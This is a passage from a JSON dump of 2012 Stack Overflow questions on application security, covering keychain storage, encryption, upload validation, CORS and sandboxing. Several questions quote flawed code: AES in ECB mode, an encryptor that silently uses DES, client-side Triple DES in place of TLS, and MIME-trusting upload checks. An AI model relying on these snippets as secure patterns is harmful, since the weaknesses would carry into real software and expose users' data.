KEYCHAIN_ITEM_ATTRIBUTES (id)kSecClassGenericPassword, kSecClass, @\"MyService\", kSecAttrService, @\"MyPassword\", kSecAttrAccount\n\nconst NSString* MyPassword = @\"blabla\";\n\n- (void)testExample\n{\n    // remove previous keychain item\n    OSStatus status = SecItemDelete((CFTypeRef)[NSDictionary dictionaryWithObjectsAndKeys:KEYCHAIN_ITEM_ATTRIBUTES, nil]);\n    NSLog(@\"SecItemDelete status:%ld\",status);\n    NSParameterAssert(status == errSecSuccess || status == errSecItemNotFound);\n\n    // add keychain item with new value\n    NSData *data = [MyPassword dataUsingEncoding:NSUTF8StringEncoding];\n    status = SecItemAdd((CFTypeRef)[NSDictionary dictionaryWithObjectsAndKeys:KEYCHAIN_ITEM_ATTRIBUTES, data, kSecValueData, nil], NULL);\n    NSLog(@\"SecItemAdd status:%ld\",status);\n    NSParameterAssert(status == errSecSuccess);\n\n    // get password\n    status = SecItemCopyMatching((CFTypeRef)[NSDictionary dictionaryWithObjectsAndKeys:KEYCHAIN_ITEM_ATTRIBUTES,\n                                             kSecMatchLimitOne, kSecMatchLimit, kCFBooleanTrue, kSecReturnData, nil], (CFTypeRef *)&amp;data);\n    NSLog(@\"SecItemCopyMatching status:%ld\",status);\n    NSParameterAssert(status == errSecSuccess);\n\n    if (status == errSecItemNotFound)\n        NSLog(@\"SecItemCopyMatching status:%ld\", status);\n    else\n        NSLog(@\"SecItemCopyMatching result:%@\",[[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);\n}\n</code></pre>\n\n<p>Regarding securityd daemon not being launched, I can check it is using </p>\n\n<pre><code>launchctl list | grep securityd\n</code></pre>\n\n<p>after the simulator starts.\nI looked at GTM's RunIPhoneUnitTest.sh script for a simple line I could use but when I try this</p>\n\n<pre><code>launchctl submit -l ios6securityd -- /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator6.0.sdk/usr/libexec/securityd\n</code></pre>\n\n<p>gives me a -5 status code on that daemon.</p>\n"},{"tags":["security","google-app-engine","http"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13245540,"title":"Google App Engine: secure inter-app communication","body":"<p>I have two apps on Google App Engine, both running under the same account, and one invokes services provided by the other over HTTPS. What is the recommended way of ensuring that only the first app is permitted to invoke the second? </p>\n\n<p>Alternatively, is there a way to specify that given endpoint can only be invoked by an app running under the same GAE account?</p>\n"},{"tags":["iphone","ios","ipad","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13254309,"title":"Is it possible to automatically launch my Enterprise sapp every time after iPad booted?","body":"<p>I'm researching a way to automatically launch my enterprise app every time after my iPad booted.</p>\n\n<p><strong>I need to setup a iPad device only for my Enterprise application</strong>. Example, same as ATM machines in india. ATM machines background is window machine and they are running the Transaction application always after the machine booted and they will never allow to quit the app. Only way to quit the app is \"switched off\"</p>\n\n<p>I found a good way to <strong>disable</strong> the iPad <strong>Home button</strong> functionality through <a href=\"http://joris.kluivers.nl/blog/2012/03/02/kiosk-mode-for-ios/\" rel=\"nofollow\"><strong>Kiosk Mode for iOS</strong></a></p>\n\n<p>Its working fine for me, however now i need to launch my Enterprise app every time manually after the reboot of iPad.</p>\n\n<p>So is it possible automatically launch my Enterprise app every time after iPad booted without jail-breaking?</p>\n\n<p>Will Apple-Store reject my application if I implement the behavior?</p>\n"},{"tags":["java","security","encryption","bouncycastle"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13248851,"title":"I encrypt data with 32 byte length using AES algorithm the result(cipher text) is 64 byte length,Is this valid?","body":"<p>I implement this via java , BouncyCastle Provider\nuse Block mode = ECB and Padding mode = PKCS7Padding</p>\n\n<p>I noticte that if i encrypt data that has 32 byte length(such as 61626162616261626162616261626162 which is hex value of abababababababab) i get 64 bytes length cipher text(f21ee0564ebd5274e10bf4590594b1e16a19592b917b19ee106f71d41d165289) is this cipher text valid? from what i read it look like if you encrypt less than 32 byte length data the algorithm will padding it to 32 byte length and produce a 32 byte length cipher text but if you put in exactly 32 byte length data shouldn't you receive the 32 byte length cipher text ,also if i put in data with more length than 32 byte it will padded to 64 byte cipher text correctly</p>\n\n<p>this is what my code look like :</p>\n\n<pre><code>    public static byte[] encrypt(byte[] plainText, byte[] keyBytes)\n        throws GeneralSecurityException {\n\n    SecretKeySpec key = new SecretKeySpec(keyBytes, \"AES\");\n\n    Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS7Padding\", \"BC\");\n    cipher.init(Cipher.ENCRYPT_MODE, key);\n\n    byte[] cipherText = cipher.doFinal(plainText);\n\n    return cipherText;\n}\n</code></pre>\n\n<p>thx for your reply</p>\n"},{"tags":["c#",".net","security","service","windows-services"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13253166,"title":"How to start a windows service from other machines?","body":"<p>I have some windows services writtin with C# language that is running on my machine. I also created a WPF Application to my customer start and stop theses services. When I run it on the same machine, it works fine, but when I try to run on other machines it does not work, and I got an exception with the message: <em>Cannot open Service Control Manager on compupter 'NAME-PC'. This operation might require other privileges.</em></p>\n\n<p>My Windows Service has a Project Installer that has a ProcessInstaller with the Account property setted to <em>LocalSystem</em>.  I'm not sure if that influence.</p>\n\n<p>How could I set the right privileges to other machines can start this service on a specific machine?</p>\n\n<p>Thank you.</p>\n"},{"tags":["c#","security","embed","ironpython"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":10775746,"title":"Embedded IronPython Security","body":"<p>I am embedding IronPython into my game engine, where you can attach scripts to objects. I don't want scripts to be able to just access the CLR whenever they want, because then they could pretty much do anything.</p>\n\n<p>Having random scripts, especially if downloaded from the internet, being able to open internet connections, access the users HDD, or modify the internal game state is a very bad thing.</p>\n\n<p>Normally people would just suggest, \"Use a seperate AppDomain\". However, unless I am severely mistaken, cross-AppDomains are slow. Very slow. Too slow for a game engine. So I am looking at alternatives.</p>\n\n<p>I thought about compiling a custom version of IronPython that stops you from being able import clr or any namespace, thus limiting it to the standard library.</p>\n\n<p>The option I would rather go with goes along the following lines:</p>\n\n<pre><code>__builtins__.__import__ = None #Stops imports working\nreload = None #Stops reloading working (specifically stops them reloading builtins\n          #giving back an unbroken __import___!\n</code></pre>\n\n<p>I read this in another stack overflow post.\nAssume that instead of setting __ builtins_<em>.</em>_ import__ to none, I instead set it to a custom function that lets you load the standard API.</p>\n\n<p>The question is, using the method outlined above, would there be any way for a script to be able to be able to get access to the clr module, the .net BCL, or anything else that could potentially do bad things? Or should I go with modifying the source? A third option?</p>\n"},{"tags":["php","security","gif"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13250471,"title":"GIF/Jpeg File containing PHP code","body":"<p>Testing a web application, I can upload GIF/Jpeg files and I know there is a possible threat when including PHP Code properly in that GIF/Jpeg (because it is modified using <a href=\"http://php.net/imagecreatetruecolor\" rel=\"nofollow\">imagecreatetruecolor</a> and <a href=\"http://php.net/imagejpeg\" rel=\"nofollow\">imagejpeg</a>).</p>\n\n<p>I was looking for an existing GIF file containing a simple PHP code (like phpinfo or echo 'hello world') just to validate that the threat was concrete.</p>\n\n<p>What would be perfect is a specifically crafted GIF image containing PHP Code in the middle OR in the palette color, but I was unsuccessful to find one.</p>\n\n<p>Thanks for your help!</p>\n"},{"tags":["iphone","objective-c","ios","security","sandbox"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":55,"score":2,"question_id":13248496,"title":"Can attackers defeat iOS keychain and data-protection encryption?","body":"<p>I am developing an iOS app that it has to store username and password and other sensitive data. I am considering using NSUserDefaults or keychain storage. \nAre there other more secure method to keep attackers from defeating iOS keychain or such data protection? </p>\n"},{"tags":["image","security","upload","permissions","username"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13250126,"title":"naming uploaded image after username?","body":"<p>I am developing using CodeIgniter framework.</p>\n\n<p>I have an image upload folder which permission is set to 755. My host is using suPHP so site users are able to upload to it.</p>\n\n<p>I just noticed that when user uploads an image, the IMAGE file permission is 666.</p>\n\n<p>I am naming the images using usernames so it would be quite easy for someone to guess that someone with username ‘hello’ would have an image stored in that directory named ‘hello.jpg’ or ‘hello.png’</p>\n\n<p>Is this unsafe? Could a malicious visitor do something like erase or replace a member’s image from that image upload directory?</p>\n\n<p>Do I have to name the image something random and then store that random image name into that user’s db table row so I know which image name matches which user?</p>\n"},{"tags":["android","web-services","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13249262,"title":"android access to secure web service","body":"<p>I have JAVA web service and I try to access to this web service from android phone with KSOAP2 library. It works perfect without SSL, but I want to secure web service with SSL. I use tomcat server and I've installed https and create certificate successfully. \nNow starts my problem. When I tried to access to my secure web service from Android, I have a problem. I find some solution how to access with KSOAP library to web service and I find some related topic here.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/9601288/how-to-consume-https-rest-service-from-android-application\">How to consume HTTPS rest service from android application</a></p>\n\n<p>It gives me the following exceptions:</p>\n\n<pre><code>11-06 10:56:39.706: W/System.err(2037): SoapFault - faultcode: 'wsse:InvalidSecurity' faultstring: 'Security Requirements not met - No Security header in message' faultactor: 'null' detail: org.kxml2.kdom.Node@41021c18\n\n11-06 10:56:39.706: W/System.err(2037): at \norg.ksoap2.serialization.SoapSerializationEnvelope.parseBody(SoapSerializationEnvelope.java:141)\n</code></pre>\n\n<p>etc..</p>\n\n<p>Does exist some functional solution for secure communication with a web service?</p>\n"},{"tags":["security","codeigniter","directory","traversal","sanitize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13248849,"title":"CodeIgniter - Directory Traversal - sanitize_filename()","body":"<p>If I use the CodeIgniter File Upload Class and rename the image being uploaded using:</p>\n\n<p><code>$config['file_name']</code></p>\n\n<p>do I still have to use</p>\n\n<p><code>$this-&gt;security-&gt;sanitize_filename()</code></p>\n\n<p>on the image being uploaded by user?</p>\n"},{"tags":["security","shell","operating-system"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13249021,"title":"stack & heap overflow exploits are no more effective?","body":"<p>Do all new OSes implement the <a href=\"http://en.wikipedia.org/wiki/NX_bit\" rel=\"nofollow\"><code>no execute bit</code></a> in order to overcome vulnerabilities that could be used to execute malicious code? for example, is it implemented in <code>Win7</code>? Do that mean that the <strong>traditional way</strong> of stack &amp; heap overflow exploits are no more effective?  </p>\n"},{"tags":["algorithm","web-services","security","verification"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13249066,"title":"Verifiying answers from application to web service and vice versa","body":"<p>Scenario:</p>\n\n<p>My Application stands in connection to Web service (Master Server). Sometimes i make calls like <strong>login on application startup</strong>, where my application sents user credentials to the master server for validating.</p>\n\n<p>So, how do i <strong>1st</strong> validate that the answer is from my <strong>real</strong> server and not a fake local webserver with routed hosts file? And <strong>2nd</strong> how do i parse this answer?</p>\n\n<p>I always parsed like this (dummy code):</p>\n\n<pre><code>if($answerFromWebserver == \"LOGIN_OK\") {\n    doLogin();\n}\n</code></pre>\n\n<p>Are there better, more safe solutions?</p>\n"},{"tags":["asp.net-mvc","security","authentication","authorization"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13249134,"title":"Performing custom authentication with authenticated domain users","body":"<p>I am aware this has been asked ad-infinitum but I am bing overwhelmed with solutions and nothing seems to work.</p>\n\n<p>My problem is a common one but I can't seem to get it to work or I am missing something.</p>\n\n<ul>\n<li>ASP.NET MVC4 </li>\n<li>Windows Authentication with User list and roles in DB</li>\n<li>Intranet website</li>\n</ul>\n\n<p>All employees are on the same domain so with Windows authentication, they are all <code>IsAuthenticated = true;</code> but only some are allowed to use this website. Those users are in a database with a list of roles so I take the domain Id of the current user, check if it exists in the db. If not then I set <code>IsAuthenticated</code> to false and route to appropriate page. If user exists I retrieve user details and want to se the <code>HttpContext.Current.User</code> to my custom Principal. So I need custom authentication and authorization. I want to performa authentication against the db once and only once.</p>\n\n<p>After authentication I will be performing authorization on a per controller, per action basis.</p>\n\n<p>I've read a <em>lot</em> online and can't seem to see the wood for the trees.</p>\n\n<p>Currently I have a custom AuthorizeAttribute overriding AuthorizeCore, I hit the db, do my authentication, then set tje HttpContext.Current.User to my custom Principal but on subsequent requests, I can't access this custom Principal, only the windowsPrincipal (because all users are on the same domain and are authenticated).</p>\n\n<pre><code>override protected bool AuthorizeCore(HttpContextBase httpContext_)\n{\n    var authorized = base.AuthorizeCore(httpContext_);\n\n    if(!authorized) { return false; }\n\n    // authenticate against the db\n    // CurrentPrincipal is a static property returning Thread.CurrentPrincipal\n    // subsequent requests return null for this CurrentPrincipal ??\n    if (MyPrincipal.CurrentPrincipal == null)\n    {\n        var cachedUser = new MyEFContext().Users\n            .Where(user_ =&gt;\n                user_.ADName == HttpContext.Current.User.Identity.Name &amp;&amp;\n                !user_.IsDeleted &amp;&amp;\n                !user_.IsDisabled)\n                .FirstOrDefault();\n\n        // SetCurrent is a static method \n        // It takes the cachedUser entity and creates a new MyCustom Principal with it\n        // and then sets the Thread.CurrentPrincipal\n        // and the HttpContext.Current.User to that custom Principal\n        MyPrincipal.SetCurrent(cachedUser);\n\n                    // below commented out but I have also tried the below\n                    //httpContext_.User = MyPrincipal.CurrentPrincipal;\n    }\n\n    // authorise\n    var isAllowed = false;\n    if (!string.IsNullOrEmpty(Roles))\n    {\n        isAllowed  = Roles == DSTPrincipal.CurrentPrincipal.AuthenticatedUser.Role;\n    }\n\n    return MyPrincipal.CurrentPrincipal != null \n        &amp;&amp; MyPrincipal.CurrentPrincipal.Identity.IsAuthenticated \n        &amp;&amp; (!string.IsNullOrEmpty(Roles) &amp;&amp; isAllowed);\n}\n</code></pre>\n\n<ol>\n<li>Where should I perform custom authentication against my db? I used to do it in Global.asax.cs or in a custom HttpModule using the AuthenticateRequest event.</li>\n<li>Is my custom AuthorizeAttribute the correct approach? Doing authenticationa and authorisation here doesn't feel right.</li>\n<li>I want to cache my custom principal so on subsequent calls I don't have to hit the db and I have access to other custom principal properties.</li>\n</ol>\n\n<p>Apologies if I am not coherent in my request. If you have any Qs then please let me know and I will try to improve my question.</p>\n\n<p>Thanks for any help and advice.</p>\n"},{"tags":["android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13248481,"title":"Settings.Secure.ANDROID_ID always the same on each device","body":"<p>I'm facing a big problem with my low cost tablets from China. Serial number is the same, device id from telephony is the same and now I discover that also Settings.Secure.ANDROID_ID is the same on each device.</p>\n\n<p>How Settings.Secure.ANDROID_ID is generated?</p>\n"},{"tags":["actionscript-3","flex","security","soap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13248776,"title":"Channel.Security.Error in Flex application","body":"<p>I have a Flex application running on several domains (HTTP). The application communicates with the server using, among other things, WSDL service that resides on HTTPS.</p>\n\n<p>For reasons unknown (to me), <em>sometimes</em> I see a log entry that tells me something like this:</p>\n\n<p><code>[FaultEvent fault=[RPC Fault faultString=\"Sikkerhetsfeil ved tilgang til URL-adresse\" faultCode=\"Channel.Security.Error\" faultDetail=\"Mål: DefaultHTTP\"] messageId=\"D2B72EF4-65FD-4A36-6117-D4DC95E63E01\" type=\"fault\" bubbles=false cancelable=true eventPhase=2]</code></p>\n\n<p>I managed to deduce from looking this error up on that it has something to do with SOAP calls.\nI tried applying some extra entries to the <code>crossdomain.xml</code> based on <a href=\"http://dotanything.wordpress.com/2008/08/11/flex-security-error-accessing-url-or-channelsecurityerror/\" rel=\"nofollow\">this info</a>, but it didn't really help.\nThe current content of the crossdomain.xml is as follows:</p>\n\n<pre><code>&lt;cross-domain-policy&gt;\n&lt;site-control permitted-cross-domain-policies=\"all\"/&gt;\n&lt;allow-access-from domain=\"*\" secure=\"false\"/&gt;\n&lt;allow-http-request-headers-from domain=\"*\" headers=\"*\" secure=\"false\"/&gt;\n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p>The most maddening thing is that this error only occurs very sporadically, and is not consistent in any immediately recognizable way.</p>\n\n<p>Anyone? A clue as to why could this be happening?</p>\n"},{"tags":["security","active-directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13240407,"title":"Secure individual attributes in Active Directory","body":"<p>I want to empower our users to edit their phone numbers (home/mobile/work) in Active Directory. What I would like to know if it is possible to have all other attributes in AD secured and read-only, while allowing users to update just this one field? That is, can I alter AD security on a per-attribute basis?</p>\n\n<p>I've tried googling and searching MSDN answers for pointers, but the concepts and keywords I'm coming up with are too general to get good results.</p>\n"},{"tags":["php","security","paypal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13246581,"title":"How to secure data that needs to be used raw","body":"<p>I have an application that needs securing. The data is data from Paypal that allow me to charge people (if they have approved me), something I want to make sure before I launch this feature on my site is, its secure.</p>\n\n<p>I know with passwords you can use salts and 1 way hashing, but as this data needs to be used in its raw format I'm wondering of ways I can store this data.</p>\n\n<p>The data will not be available to the users or me, but It will be stored in a database and I'm wanting to make it so if the database gets hacked then there is nothing of 'value'.</p>\n\n<p>Can anyone offer me any advice or solutions to my problem?</p>\n"},{"tags":["ruby-on-rails","security","cors"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13242049,"title":"Security for cross-origin resource sharing","body":"<p>I have 2 ruby on rails app sitting on 2 different domains (say <em><code>www.exampleA.com</code></em> and <em><code>www.exampleB.com</code></em>. I want to share resources between the 2 apps and I'm using CORS:</p>\n\n<p><em><code>exampleA.com</code></em> sends http POST request to <em><code>exampleB.com</code></em>. </p>\n\n<p>At <em><code>exampleB.com</code></em> I'm checking <code>request.env['HTTP_ORIGIN']</code> to make sure that the request comes from <em><code>exampleA.com</code></em>. If true I respond by setting the response headers to allow the http post request.</p>\n\n<p>My question is can I use <code>request.env['HTTP_ORIGIN']</code> as the only check to verify the identity of requester? </p>\n\n<p>Is it possible for someone from <em><code>www.exampleC.com</code></em> to fake their HTTP_ORIGIN to look like <em><code>www.exampleA.com</code></em> and post malicious data? If so what's the best way to verify requester identity?</p>\n"},{"tags":["java","android","security","encryption","obfuscation"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":13243272,"title":"Encrypting Android code?","body":"<p>I know obfuscation but what it does is only to make the code harder to understand. It doesn't really encrypt the code. Is there a way to encrypt Android code? Or is there any alternative to make the code more irrecoverable when decompiled?</p>\n\n<p>I am asking this question to know if what I'm looking for is possible. Right now, my mind suggest that it is impossible to encrypt the code since if we encrypt it, Dalvik also won't be able to understand the code and run it. But I'm not really sure about it. It is possible that I didn't know something.</p>\n\n<p>Please post what do you think about this or if you have any suggestions? Also, please consider a financial application wherein having access to a human readable code means being able to understand the flow of the financial process going-on on the backend. Thank you!</p>\n"},{"tags":["javascript","security","encryption","twitter","passwords"],"answer_count":11,"favorite_count":1,"up_vote_count":8,"down_vote_count":1,"view_count":8385,"score":7,"question_id":38838,"title":"Two-way password encryption without ssl","body":"<p>I am using the <a href=\"http://apiwiki.twitter.com/\" rel=\"nofollow\">twitter API</a> to <a href=\"http://www.simsbox.net/blog/7/integrating-twitter-with-blog-comments/\" rel=\"nofollow\">integrate twitter</a> with my blog's commenting system.  The problem with the twitter API and many other web APIs out there is that they require the user's username and password to do anything useful.  I don't want to deal with the hassle and cost of installing a SSL certificate, but I also don't want passwords passed over the wire in clear text.</p>\n\n<p>I guess my general question is: <strong>How can I send sensitive data over an insecure channel?</strong></p>\n\n<p>This is my current solution and I'd like to know if there are any holes in it:</p>\n\n<ol>\n<li>Generate a random key on the server (I'm using php).</li>\n<li>Save the key in a session and also output the key in a javascript variable.</li>\n<li>On form submit, use <a href=\"http://tero.co.uk/des/\" rel=\"nofollow\">Triple DES in javascript</a> with the key to encrypt the password.</li>\n<li>On the server, decrypt the password using the key from the session and then destroy the session.</li>\n</ol>\n\n<p>The end result is that only the encrypted password is sent over the wire and the key is only used once and never sent with the password.  Problem solved?</p>\n"},{"tags":["security","https"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13242942,"title":"Is passing username/password in http string safe for this API?","body":"<p>Reading over \n<a href=\"http://getpocket.com/api/docs/\" rel=\"nofollow\">http://getpocket.com/api/docs/</a></p>\n\n<p>Is it safe to pass a password through the HTTP string? My understand is that this is not safe, even though it's HTTPS. Correct?</p>\n"},{"tags":["java","security","authentication","guice","shiro"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":96,"score":3,"question_id":12894227,"title":"Authentication against database using shiro 1.2.1","body":"<p>I am using Apache Shiro in my project. Currently I am using 1.1.0 version and now I am trying to migrate Shiro components to latest version 1.2.1. But when I try to do user authentication against a db it not working for some reason and I am not getting any errors but authentication is not happening.</p>\n\n<p>Following are the database details I had given in shiro.ini file.</p>\n\n<pre><code>[main]\ncacheManager = com.cacheManager.ShiroCacheManager\nsecurityManager.cacheManager = $cacheManager\n\njdbcRealm=org.apache.shiro.realm.jdbc.JdbcRealm\n\njdbcRealm.authenticationQuery = select user_pass from users where user_name = ?\njdbcRealm.userRolesQuery = select role_name from user_roles where user_name = ?\n\nds = com.mysql.jdbc.jdbc2.optional.MysqlDataSource\nds.serverName = 192.168.0.75\nds.port  = 3306\nds.user = test\nds.databaseName = appfuse\njdbcRealm.dataSource = $ds\n</code></pre>\n\n<p>But still it is not hitting the database. I am using tomcat server and trying to use guice and shiro integration example...</p>\n\n<p>Any help in this regard is really appreciated and thanks in advance for your help!</p>\n\n<p>Thanks &amp; Regards, \n<br />Gupta Katakam</p>\n"},{"tags":["c#",".net","security","aes","rijndael"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":13079150,"title":"Encrypt and Decrypt with Rijndael data too long","body":"<p>I'm trying to get this code to encrypt and decrypt but I keep getting data length too long when decrypting during the <code>.FlushFinalBlock()</code>.</p>\n\n<p>I'm not sure what I'm doing wrong here because I'm out of my element on this issue.</p>\n\n<p>Can anyone tell me what I'm doing wrong here? Encryption is OK, but it cannot decrypt its encryption.</p>\n\n<pre><code>   static byte[] u8_Salt = new byte[] { 0x26, 0x19, 0x81, 0x4E, 0xA0, 0x6D, 0x95, 0x34, 0x26, 0x75, 0x64, 0x05, 0xF6 };\n\n   public static string Encrypt(string data, string password)\n    {\n        //\n        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, u8_Salt);\n        //\n        Rijndael i_Alg = Rijndael.Create();\n        i_Alg.Padding = PaddingMode.None;\n        i_Alg.Key = pdb.GetBytes(32);\n        i_Alg.IV = pdb.GetBytes(16);\n        //\n        using (var cryptoProvider = new DESCryptoServiceProvider())\n        using (var memoryStream = new MemoryStream())\n        using (var cryptoStream = new CryptoStream(memoryStream, cryptoProvider.CreateEncryptor(), CryptoStreamMode.Write))\n        using (var writer = new StreamWriter(cryptoStream))\n        {\n            writer.Write(data);\n            writer.Flush();\n            cryptoStream.FlushFinalBlock();\n            writer.Flush();\n            return Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);\n        }\n    }\n    public static string Decrypt(string data, string password)\n    {\n        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, u8_Salt);\n        //\n        Rijndael i_Alg = Rijndael.Create();\n        i_Alg.Padding = PaddingMode.None;\n        i_Alg.Key = pdb.GetBytes(32);\n        i_Alg.IV = pdb.GetBytes(16);\n        //\n        using (var cryptoProvider = new DESCryptoServiceProvider())\n        using (var memoryStream = new MemoryStream())\n        using (var cryptoStream = new CryptoStream(memoryStream, cryptoProvider.CreateDecryptor(), CryptoStreamMode.Write))\n        using (var writer = new StreamWriter(cryptoStream))\n        {\n            writer.Write(data);\n            writer.Flush();\n            cryptoStream.FlushFinalBlock();\n            writer.Flush();\n            return Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);\n        }\n    }\n</code></pre>\n"},{"tags":["c#","wpf","security","principal"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13233683,"title":"Setting CurrentPrincipal for a WPF application from within a test","body":"<p>we have a WPF application that uses CurrentPrincipal to handle security. This all works fine.</p>\n\n<p>Now, from within a test project, we call view model operations. The problem is, that in the initialization of the test we create a new instance of the application but we don't know how to set the CurrentPrincipal on this application:</p>\n\n<pre><code> private void TestInitialize()\n {\n      var app = new App();\n      // setting Thread.CurrentPrincipal doesn't set app thread it seems\n }\n</code></pre>\n\n<p>Anyone has an idea how to set the CurrentPrincipal for a WPF application from outside the application?</p>\n"},{"tags":["security","identity","google-cloud-messaging"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13235810,"title":"Google Cloud Messaging and Identity","body":"<p>I've read through all the offical documentation, but I couldt not find the answer for the following questions:</p>\n\n<ul>\n<li><p>What key does the Android send to the Google server so it can identify the device (+user?). The question is more like: If I have 2 devices with the same account and install the app on both (both will have different Registration IDs). Is it the serial number of the device? Or it combines something with the Google ID stored on the device? </p></li>\n<li><p>How does GCM application does not require Google Account if it requires Google Play instaled and authenticated with at least one Google User?</p></li>\n<li><p>If my application supports multiple users (multiple Google accounts on the same device), the application itself cannot register twice and differentiate the messages received by GCM, right?</p></li>\n<li><p>If I have Google Play with 2 accounts, does it affect GCM at all? Or having at least one or 10 does not matter?</p></li>\n</ul>\n\n<p>The questions above are part of a security analysis. Any help or official documentation is pretty much appreciated.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","image","security","file-upload","gd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":13236782,"title":"Secure image upload PHP","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/11061355/security-threats-with-uploads\">Security threats with uploads</a>  </p>\n</blockquote>\n\n\n\n<p>I've been searching for a good script/tutorial for secure image upload, but whatever I find, reading the comments there seem to be issues with the script as far as security is concerned. So I tried to compose my on script. I would like to ask for any security suggestions on this.</p>\n\n<pre><code>//create arrays from allowed extensions and types\n$allowed_exts = array(\"jpg\", \"jpeg\", \"png\", \"gif\");\n$allowed_types = array(\"image/jpeg\", \"image/png\", \"image/gif\");\n\n//extract extension from uploaded file\n$ext = strtolower(substr($_FILES[\"image\"][\"name\"], strrpos($_FILES[\"image\"][\"name\"], \".\") + 1));\n</code></pre>\n\n<p>I first check if the extension is one of the allowed</p>\n\n<pre><code> if(in_array($ext, $allowed_exts) === false){\n    echo \"Only .jpg, .png, .gif allowed\";\n    }\n</code></pre>\n\n<p>Then check if the type is one of the allowed</p>\n\n<pre><code> elseif(in_array($_FILES[\"image\"][\"type\"], $allowed_types) === false){\n    echo \"Only .jpg, .png, .gif allowed\";\n    }\n</code></pre>\n\n<p>Then check the filesize</p>\n\n<pre><code>elseif($_FILES[\"image\"][\"size\"] &gt; 2100000){\n    echo \"File is too big\";\n}\n</code></pre>\n\n<p>Now use getimagesize to check for dimensions</p>\n\n<pre><code>   elseif(!getimagesize($_FILES[\"image\"][\"tmp_name\"])){ \n    echo \"File is not an image\";\n    } else {\n</code></pre>\n\n<p>I create a random file name</p>\n\n<pre><code>$filename = mt_rand(1000,99999).\"_\".$_POST['p_id'].\".jpg\";\n</code></pre>\n\n<p>If this is all fine, I create a thumb using GD. In short (incase its a jpeg):</p>\n\n<pre><code>a. imagecreatefromjpeg -&gt; from uploaded file\nb. imagecreatetruecolor -&gt; with desired thumbnail dimensions\nc. imagecopyresampled -&gt; modify the image created under a.\nd. imagejpeg -&gt; save image to destination\n</code></pre>\n\n<p>So, as I've read this should eliminate most problems that come with the image, but I m sure I missed something important.</p>\n\n<p>The directory I write the files to has 755 permission, but I think I have to make more restrictions on the directory by putting a .htaccess in the folder? What should be in there?</p>\n"},{"tags":["java","security","authentication","iframe","salesforce"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13226288,"title":"iFrame Authentication","body":"<p>I am in the midway of integrating <strong>salesforce.com with a legacy system via iFrame</strong> link consisting of <strong>orgId</strong> as request parameter and legacy system(Java Application) upon getting orgId as request parameter check db of legacy system whether this orgId already exist or not (prior existence means Salesforce user has grant access to the legacy System Application), so question which remains unanswered is <strong>if somehow orgId gets captured by intruder then they can access legacy system application</strong> easily, so challenge is to stop any such attacks.\nFYI both iFrame link and salesforce site runs on https protocol.</p>\n"},{"tags":["mysql","sql","query","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13238850,"title":"Override column value in WHERE clause?","body":"<p>I was wondering if it was possible to override column value in the Where clause of a SQL query (MySQL in my case).</p>\n\n<p>To be more clear, here is an example :</p>\n\n<p>Suppose a basic query is :</p>\n\n<pre><code>SELECT lastname, firstname FROM contacts WHERE lastname = \"Doe\";\n</code></pre>\n\n<p>Is it possible to force <code>lastname</code> and <code>firstname</code> to return value from an other table, just by modifying what is after the WHERE part ? Something like 